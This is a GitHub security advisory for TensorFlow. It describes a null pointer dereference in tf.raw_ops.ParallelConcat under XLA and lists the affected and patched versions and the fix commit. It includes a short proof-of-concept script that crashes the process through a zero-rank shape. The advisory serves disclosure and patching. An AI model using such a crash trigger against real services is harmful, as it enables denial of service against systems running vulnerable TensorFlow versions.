# Null dereference on ParallelConcat with XLA

Moderate

[pak-laura](/pak-laura)
published
GHSA-6wfh-89q8-44jq
Mar 24, 2023

## Package

pip

tensorflow, tensorflow-cpu, tensorflow-gpu
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.12.0

## Patched versions

2.12.0, 2.11.1

## Description

### Impact

When running with XLA, `tf.raw_ops.ParallelConcat` segfaults with a nullptr dereference when given a parameter `shape` with rank that is not greater than zero.

```
import tensorflow as tf

func = tf.raw_ops.ParallelConcat
para = {'shape':  0, 'values': [1]}

@tf.function(jit_compile=True)
def test():
   y = func(**para)
   return y

test()
```
### Patches

We have patched the issue in GitHub commit [da66bc6d5ff466aee084f9e7397980a24890cd15](https://github.com/tensorflow/tensorflow/commit/da66bc6d5ff466aee084f9e7397980a24890cd15).

The fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.

### For more information

Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
